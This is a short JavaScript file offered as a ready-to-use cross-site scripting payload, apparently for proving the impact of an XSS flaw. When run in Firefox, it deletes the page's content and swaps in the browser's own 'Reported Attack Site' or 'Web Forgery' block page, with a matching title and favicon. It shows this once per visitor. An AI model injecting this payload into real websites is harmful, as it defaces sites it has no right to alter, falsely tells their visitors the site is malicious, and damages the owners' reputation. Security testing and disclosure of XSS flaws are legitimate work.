// use this script when you discover an XSS exploit on a website
// what Firefox users will see is what _could_ happen if you wanted to put malicious code on the site

(function () {
	if (navigator.userAgent.indexOf("Gecko/") !== -1) {
		var window = this,
		localStorage = window.localStorage,
		blockType = (new Error).fileName.split("#")[1] || "malware";
		// blockType can be "malware" or "phishing"
		
		if (typeof localStorage === "undefined" && typeof window.globalStorage !== "undefined") {
			var localStorage = window.globalStorage[location.hostname];
		}
		if (typeof localStorage !== "undefined" && !localStorage.getItem("visited")) {
			localStorage.setItem("visited", true);
			
			document.title = "Reported " + (blockType === "phishing" ? "Web Forgery" : "Attack Site") + "!";
			var doc = document,
			docEl = doc.documentElement,
			childNodes = docEl.childNodes,
			i = childNodes.length,
			frameset = doc.createElement("frameset"),
			frame = doc.createElement("frame"),
			favicon = doc.createElement("link");
			favicon.rel = "icon";
			// backlist_favicon.png
			favicon.href = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAN1wAADdcBQiibeAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAIMSURBVDiNjZPPSlRhGIefd86Zc0ZHz2QdE3QiKJUWgjtxISQitAuCFoFuuoS5gegOvARXgrtAcJVEegcjRNPgYggha5TTnJnJ8/9tUU4THYYe+O3e74Hv/X6fqCrD7Ik4KdSKIpsxLAMUoR6rHhmws6XqD8/LsGBXZMMU2V9cWKjcf/jQcubmEMOgc3HB52Yz+tRodBLVFy9V3/0j2BXZsG374PHqavn2xATaaqGeByKI6yLz83zv93l/fNwPrq+f3khEVdkTcTI4W1tZmb4Vx6TNJnmYS0t0bJuTk5N2Aea3VP0CQAy12ZmZyjjQbzQIsiw3vdNTxoC5arUSQw2gAGCKbLqOY12fnxOqjsyPVovpqSnLFNkEMAES1WXTsgi6Xe4dHmJWq7lXSD2P8+1tTNsmUV0eCADCIMBQRW0bKZVyBdg2oSppEPzZC4AB9U63uzYWRdTX1/MP/8aoVAijCAPqgx2kcHTl+2FsWYRZNjJJqcSV54UpHA0ERdjpBYHfCQLicplANTeJ4+AHAX6v5xdhZ9AD+FUkgYM7jlO2LYssitAkAUCKRYxSiTCOufS8vqr+XaQbdkU2jEJh33VdZ9p17YnJSRCh3+vxrd0OL9ttP82y/CrfsCfipKZZ+zJefnU3jgoAXy2b2X7vtZEkoz/TMA8WHwVPnj23Ad4evOHs4wfJmyuMfLP/4CfAY0C15Euf2QAAAABJRU5ErkJggg==";
			
			frame.src = "about:blocked?e=" + blockType + "Blocked&u=" + encodeURIComponent(location.href);
			frameset.appendChild(frame);
			
			while (i--) {
				docEl.removeChild(childNodes[i]);
			}
			
			docEl.appendChild(frameset);
			docEl.appendChild(favicon);
		}
	}
}.call(this));
